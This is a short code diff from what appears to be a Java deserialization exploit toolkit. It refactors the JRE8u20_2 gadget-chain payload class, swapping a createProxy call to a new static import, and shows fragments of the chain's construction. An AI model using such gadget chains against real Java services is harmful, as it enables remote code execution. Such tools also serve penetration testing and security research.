@@ -16,6 +16,8 @@ import java.util.HashMap;
 import java.util.LinkedHashSet;
 import java.util.Map;
 
+import static com.qi4l.JYso.gadgets.JDKUtil.createProxy;
+
 
 public class JRE8u20_2 implements ObjectPayload<Object> {
     public static Class newInvocationHandlerClass() throws Exception {
@@ -41,7 +43,7 @@ public class JRE8u20_2 implements ObjectPayload<Object> {
         InvocationHandler ih = (InvocationHandler) constructor.newInstance(Override.class, new HashMap<>());
 
         Reflections.setFieldValue(ih, "type", Templates.class);
-        Templates proxy = Gadgets.createProxy(ih, Templates.class);
+        Templates proxy = createProxy(ih, Templates.class);
 
         BeanContextSupport b = new BeanContextSupport();
         Reflections.setFieldValue(b, "serializable", 1);
